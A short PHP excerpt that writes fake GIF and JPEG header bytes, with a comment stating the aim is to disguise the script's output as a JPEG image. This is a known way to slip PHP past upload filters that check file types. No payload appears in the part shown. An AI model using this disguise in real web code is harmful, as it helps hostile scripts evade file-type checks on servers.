...
<!-- GIF89;a -->
<?php
// === Fake minimal JPEG header to disguise output as JPEG
echo "\xFF\xD8";      // SOI - Start Of Image
echo "\xFF\xE0";      // APP0 marker (JFIF)
echo "\x00\x10";      // APP0 length
echo "JFIF\x00";      // Identifier
echo "\x01\x02";      // Version 1.02
echo "\x00";          // No units
echo "\x00\x01\x00\x01";  // Xdensity=1, Ydensity=1
echo "\x00\x00";      // No thumbnail
echo "\xFF\xDB";      // DQT marker (start of quantization table)
echo "\x00\x43";      // Length of DQT segment
echo "\x00";          // QT info (table 0)
echo str_repeat("\x08", 64);  // Dummy quantization table data
